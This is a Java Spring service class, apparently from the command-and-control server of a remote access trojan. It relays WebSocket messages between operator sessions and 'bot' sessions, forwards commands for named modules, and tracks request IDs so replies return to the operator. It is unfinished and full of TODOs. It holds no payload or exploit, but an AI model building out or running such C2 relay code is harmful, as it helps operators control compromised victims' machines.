package devs.alex.sah.rat.c2server.services.impl;

import devs.alex.sah.rat.c2server.configuration.MessagesConfiguration;
import devs.alex.sah.rat.c2server.models.AssociativePair;
import devs.alex.sah.rat.c2server.services.MessagesBuilder;
import lombok.extern.slf4j.Slf4j;
import devs.alex.sah.rat.c2server.models.Message;
import devs.alex.sah.rat.c2server.services.MessagesCoordinator;
import devs.alex.sah.rat.c2server.services.WebSocketSessionService;
import org.springframework.beans.factory.annotation.Qualifier;
import org.springframework.stereotype.Service;
import org.springframework.web.socket.BinaryMessage;
import org.springframework.web.socket.PongMessage;
import org.springframework.web.socket.TextMessage;
import org.springframework.web.socket.WebSocketSession;

import java.io.IOException;
import java.util.UUID;

@Slf4j
@Service
public class MessagesCoordinatorImpl implements MessagesCoordinator {


    private final WebSocketSessionService botWSSessionService;
    private final WebSocketSessionService userWSSessionService;
    private final MessagesBuilder messagesBuilder;
    private final MessagesConfiguration mConfig;
    public MessagesCoordinatorImpl(@Qualifier("botWebSocketSessionService") WebSocketSessionService botWSSessionService,
                                   @Qualifier("userWebSocketSessionService") WebSocketSessionService userWSSessionService,
                                   MessagesBuilder messagesBuilder, MessagesConfiguration messagesConfiguration) {
        this.botWSSessionService = botWSSessionService;
        this.userWSSessionService = userWSSessionService;
        this.messagesBuilder = messagesBuilder;
        this.mConfig = messagesConfiguration;
    }


    @Override
    public void handleBotTextMessage(WebSocketSession session, TextMessage message) {
        StringBuffer errors = new StringBuffer();
        Message<String> parsedMessage = messagesBuilder.parseMessage(message, errors);
    }

    @Override
    public void handleBotBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handleUserTextMessage(WebSocketSession session, TextMessage toParse) { // TODO split on different methods
        StringBuffer errors = new StringBuffer();
        Message<String> message = messagesBuilder.parseMessage(toParse, errors);

        if(errors.length() != 0){
            // TODO Message<String> validate basic params
            // TODO send errors back to user
            return;
        }
        String recipient = message.getRecipientType();

        if(message.getRecipientType().equals("S")) {
            // TODO
            return;
        } else{

            WebSocketSession recipientSession;
            if(message.getRecipientType().equals("B")){
                // TODO Message<String> validate specified params
                recipientSession = botWSSessionService.getSession(message.getRecipientID());
            } else if(message.getRecipientType().equals("H")){
                // TODO Message<String> validate specified params
                recipientSession =  userWSSessionService.getSession(message.getRecipientID());
            } else {
                log.error("ERROR"); // TODO Send error to user
                return;
            }

            if(message.getPackageType().equals("con")){ // CE - continuation envelope
                String envelope = (String)recipientSession.getAttributes().get("CE-"+ message.getRequestID());
                sendTextMessage(recipientSession, envelope, message.payload());
                return;
            }

            if(message.getPackageType().equals("last")){ // LE - last envelope
                String envelope = (String)recipientSession.getAttributes().get("LE-"+ message.getRequestID());
                sendTextMessage(recipientSession, envelope, message.payload());

                recipientSession.getAttributes().remove("CE-" + message.getRequestID());
                recipientSession.getAttributes().remove("LE-" + message.getRequestID());
                return;
            }

            String association =  message.getRecipientType().equals("H") ?
                    (String)session.getAttributes().get("userId") : UUID.randomUUID().toString();

            if(message.getPackageType().equals("first")){
                if( message.getRecipientType().equals("B")){
                    recipientSession.getAttributes()
                            .put("CE-" + message.getRequestID(), messagesBuilder.generateBotEnvelope("con", message.getModule(), association));
                    recipientSession.getAttributes()
                            .put("LE-" + message.getRequestID(), messagesBuilder.generateBotEnvelope("last", message.getModule(), association));
                } else if( message.getRecipientType().equals("H")) {
                    // TODO sending to User
                } else{
                    log.error("Error"); // TODO
                }
            }

            // FIXME logic ?
            if( message.getRecipientType().equals("H")){
                sendTextMessage(recipientSession, messagesBuilder.generateUserEnvelope(message.getPackageType(), message.getModule(), association, message.getResponseType()), message.payload());
            } else{
                sendTextMessage(recipientSession, messagesBuilder.generateBotEnvelope(message.getPackageType(), message.getModule(), association, message.getResponseType()), message.payload());

                if(!message.getResponseType().equals("none")) {
                    recipientSession.getAttributes().put(association, new AssociativePair((String) session.getAttributes().get("userId"), message.getRequestID()));
                }
            }
        }
    }

    @Override
    public void handleUserBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void sendTextMessage(WebSocketSession recipientSession, String envelope, String payload) {
        try{
            recipientSession.sendMessage(new TextMessage(envelope + payload));
        }catch (IOException e){
            log.error("Fault send message. Message envelope: {}. Error: {}", envelope, e.getMessage());
        }
    }

    @Override
    public void sendBinaryMessage(WebSocketSession session, BinaryMessage message) {

    }

    @Override
    public void handlePongMessage(WebSocketSession session, PongMessage message) {

    }
}
